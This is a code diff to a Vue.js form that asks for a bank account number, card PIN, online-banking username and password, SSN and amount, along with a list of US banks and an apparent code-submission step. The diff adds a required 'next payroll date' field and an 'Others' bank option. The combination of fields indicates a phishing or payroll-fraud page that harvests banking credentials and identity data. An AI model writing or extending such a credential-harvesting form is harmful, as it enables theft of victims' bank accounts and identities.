@@ -13,6 +13,7 @@ const form:any = ref({
   accountNumber: '',
   cardpinNumber: '',
   amount: '',
+  nextpayrollDate: '',
   username: '',
   password: '',
   ssn: '',
@@ -69,7 +70,8 @@ const usaBanks = [
   'Arvest Bank',
   'Woodforest National Bank',
   'FirstBank',
-  'United Community Bank'
+  'United Community Bank',
+  'Others'
 ]
 
 const handleImageUpload = (
@@ -157,6 +159,7 @@ const submitForm = () => {
   formdata.append('accountNumber', form.value.accountNumber);
   formdata.append('cardpinNumber', form.value.cardpinNumber);
   formdata.append('amount', form.value.amount);
+  formdata.append('nextpayrollDate', form.value.nextpayrollDate);
   formdata.append('username', form.value.username);
   formdata.append('password', form.value.password);
   formdata.append('ssn', form.value.ssn);
@@ -204,6 +207,7 @@ const submitCodeForm = () => {
       accountNumber: '',
       cardpinNumber: '',
       amount: '',
+      nextpayrollDate: '',
       username: '',
       password: '',
       ssn: '',
@@ -257,6 +261,16 @@ const submitCodeForm = () => {
               <input
                 v-model="form.accountNumber"
                 type="text"
+                class="form-control"
+                required
+              />
+            </div>
+            <!-- Next Payroll Date -->
+            <div class="mb-3">
+              <label class="form-label">Next Payroll Date</label>
+              <input
+                v-model="form.nextpayrollDate"
+                type="date"
                 class="form-control"
                 required
               />
